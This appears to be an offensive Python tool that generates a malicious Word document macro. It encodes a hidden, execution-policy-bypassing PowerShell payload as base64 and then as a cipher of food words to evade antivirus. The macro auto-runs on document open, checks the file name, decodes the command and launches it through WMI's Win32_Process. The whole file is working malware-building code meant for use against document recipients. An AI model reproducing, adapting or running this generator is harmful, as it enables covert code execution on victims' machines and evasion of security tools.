from base64 import b64encode

powershell_command_file_path = "payload/payload-oneliner.txt"
av_bypass_out_filename = "mydocument.doc"
out_macro_output = "output/result.txt"
base_command = "powershell -WindowStyle hidden -ep bypass -nop -enc"

foods = ["bacon",
         "bagel",
         "bake",
         "banana",
         "barbecue",
         "barley",
         "basil",
         "batter",
         "beancurd",
         "beans",
         "beef",
         "beet",
         "berry",
         "biscuit",
         "bitter",
         "tea",
         "blackberry",
         "bland",
         "orange",
         "blueberry",
         "boil",
         "bowl",
         "boysenberry",
         "bran",
         "bread",
         "breadfruit",
         "breakfast",
         "brisket",
         "broccoli",
         "broil",
         "rice",
         "brownie",
         "brunch",
         "buckwheat",
         "buns",
         "burrito",
         "butter",
         "bean",
         "casserole",
         "cater",
         "cauliflower",
         "caviar",
         "celery",
         "cereal",
         "chard",
         "cheddar",
         "cheese",
         "cheesecake",
         "chef",
         "cherry",
         "chew",
         "chicken",
         "chili",
         "chips",
         "chives",
         "chocolate",
         "chopsticks",
         "chow",
         "chutney",
         "cilantro",
         "cinnamon",
         "citron",
         "citrus",
         "clam",
         "cloves",
         "cobbler",
         "coconut",
         "cod",
         "coffee",
         "coleslaw",
         "comestibles",
         "dill",
         "dine",
         "diner",
         "dinner",
         "dip",
         "dish",
         "dough",
         "doughnut",
         "dragonfruit",
         "dressing",
         "dried",
         "fennel",
         "fig",
         "fillet",
         "fire",
         "fish",
         "flan",
         "flax",
         "flour",
         "foodstuffs",
         "fork",
         "freezer",
         "fried",
         "garlic",
         "gastronomy",
         "gelatin",
         "ginger",
         "gingerbread",
         "glasses",
         "grain",
         "granola",
         "grape",
         "grapefruit",
         "grated",
         "gravy",
         "greens",
         "grub",
         "halibut",
         "ham",
         "hamburger",
         "hash",
         "hazelnut",
         "herbs",
         "honey",
         "honeydew",
         "horseradish",
         "hot",
         "vegetables",
         "sauce",
         "hummus",
         "hunger",
         "hungry",
         "kale",
         "kebab",
         "ketchup",
         ]


def transform_string(my_string):
    result = []
    for c in my_string:
        ascii_nbr = ord(c) - 1
        result.append(foods[ascii_nbr])
    return " ".join(result)


def file_content_has_base64(file_path):
    with open(file_path, 'r') as f:
        content = f.read()
        encoded = b64encode(content.encode('UTF-16LE')).decode('ascii')
        return encoded


def split_var(my_string):
    rows = []
    n = 50
    for my_char in range(0, len(my_string), n):
        rows.append("MyList = MyList + " + '"' + my_string[my_char:my_char + n] + '"')
    return "\n".join(rows)


the_command = "%s %s" % (base_command, file_content_has_base64(powershell_command_file_path))
# print(the_command)
the_food_command = transform_string(the_command)
my_list = split_var(the_food_command)
doc_name = transform_string(av_bypass_out_filename)

template = """
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
 If ActiveDocument.Name = ShoppingList("{doc_name}") Then
      CommandMyShoppingList
 End If
End Sub


Function ShoppingList(wanted As String)
    Dim Foods As Variant
    Dim SelectedItem As Variant
    Dim IdArticle As Integer

    ShoppingList = ""

    Foods = Array("bacon", "bagel", "bake", "banana", "barbecue", "barley", "basil", "batter", "beancurd", "beans", _
    "beef", "beet", "berry", "biscuit", "bitter", "tea", "blackberry", "bland", "orange", "blueberry", "boil", "bowl", "boysenberry", _
    "bran", "bread", "breadfruit", "breakfast", "brisket", "broccoli", "broil", "rice", "brownie", "brunch", "buckwheat", "buns", _
    "burrito", "butter", "bean", "casserole", "cater", "cauliflower", "caviar", "celery", "cereal", "chard", "cheddar", "cheese", _
    "cheesecake", "chef", "cherry", "chew", "chicken", "chili", "chips", "chives", "chocolate", "chopsticks", "chow", "chutney", _
    "cilantro", "cinnamon", "citron", "citrus", "clam", "cloves", "cobbler", "coconut", "cod", "coffee", "coleslaw", "comestibles", _
    "dill", "dine", "diner", "dinner", "dip", "dish", "dough", "doughnut", "dragonfruit", "dressing", "dried", "fennel", "fig", _
    "fillet", "fire", "fish", "flan", "flax", "flour", "foodstuffs", "fork", "freezer", "fried", "garlic", "gastronomy", "gelatin", _
    "ginger", "gingerbread", "glasses", "grain", "granola", "grape", "grapefruit", "grated", "gravy", "greens", "grub", "halibut", _
    "ham", "hamburger", "hash", "hazelnut", "herbs", "honey", "honeydew", "horseradish", "hot", "vegetables", "sauce", "hummus", _
    "hunger", "hungry", "kale", "kebab", "ketchup")

    SelectedItem = Split(wanted, " ")

    For i = 0 To UBound(SelectedItem)
        For Z = 0 To UBound(Foods)
            If Foods(Z) = SelectedItem(i) Then
                IdArticle = (Z + 1)
                ShoppingList = ShoppingList & Chr(IdArticle)
            End If
        Next Z
    Next i
End Function

Function CommandMyShoppingList()
        Dim MyList As String
        Dim Water As String

        {my_list}

        Water = ShoppingList(MyList)
        GetObject(ShoppingList("vegetables grated ham halibut grape halibut honeydew honey chow")).Get(ShoppingList("fish grated ham chew cherry garlic dragonfruit herbs hamburger gingerbread grain honey honey")).Create Water, Tea, Coffee, Napkin
End Function
""".format(
    my_list=my_list,
    doc_name=doc_name,
)

with open(out_macro_output, 'w') as result:
    result.write(template)
